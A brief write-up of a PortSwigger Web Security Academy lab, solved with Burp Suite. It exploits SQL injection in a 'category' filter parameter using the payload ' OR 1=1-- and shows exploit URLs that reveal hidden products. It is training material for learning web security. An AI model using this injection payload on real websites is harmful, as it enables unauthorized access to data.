# Manual Solution Using Burp Suite Community

## Lab

**SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

> **Note:** Replace the lab URL below with your own PortSwigger Web Security Academy lab instance.

### Original URL

```text
https://0a0b002103cc53a28268c5f900b90029.web-security-academy.net/filter?category=Gifts
```

### Injection Point

```text
category
```

### Payload

```sql
' OR 1=1--
```

### Exploit URL

```text
https://0a0b002103cc53a28268c5f900b90029.web-security-academy.net/filter?category=%27+OR+1=1--
```

or

```text
https://0a0b002103cc53a28268c5f900b90029.web-security-academy.net/filter?category=' OR 1=1--
```

The application returns all products, including those that are normally hidden.
